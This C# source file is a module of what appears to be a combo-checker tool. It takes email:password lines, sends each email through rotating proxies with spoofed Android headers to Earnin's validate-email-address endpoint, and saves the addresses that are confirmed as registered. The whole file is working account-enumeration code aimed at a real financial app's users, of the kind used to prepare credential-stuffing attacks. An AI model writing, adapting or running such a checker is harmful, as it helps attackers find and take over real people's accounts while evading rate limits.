using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using HttpStatusCode = Leaf.xNet.HttpStatusCode;
using Console = Colorful.Console;

namespace UHQKEK.Modules.VM
{
    class earnin
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                Guid gid1 = Guid.NewGuid();
                string gid = gid1.ToString();
                httpRequest.AddHeader("Accept", "application/json");
                httpRequest.AddHeader("DeviceID", gid);
                httpRequest.AddHeader("version", "11.4.1");
                httpRequest.AddHeader("os", "android");
                httpRequest.AddHeader("RequestId", "2328e88c-1a7c-4f56-a363-04e996f976d4");
                httpRequest.AddHeader("FlowId", "1629212409354");
                httpRequest.AddHeader("X-Anonymous-User-Id", "19c87799-814b-4d79-8200-83191344ef3f");
                httpRequest.AddHeader("Host", "nativeapi.earnin.com");
                httpRequest.AddHeader("User-Agent", "okhttp/4.9.0");
                httpRequest.AddHeader("Accept-Encoding", "gzip");
                var str1 = httpRequest.Post("https://nativeapi.earnin.com/authentication/validate-email-address", "{\"Email\":\"" + strArray1[0] + "\"}", "application/json");
                string str2 = str1.ToString();
                if (str2.Contains("{\"Reason\":\"LoginEmailExists\"}"))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Green);
                    }
                    Program.Save(combo, "Eaarnin VM");
                    return true;
                }
                else if (str1.StatusCode == HttpStatusCode.NoContent)
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    ////Program.Save(combo, "Invalids");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
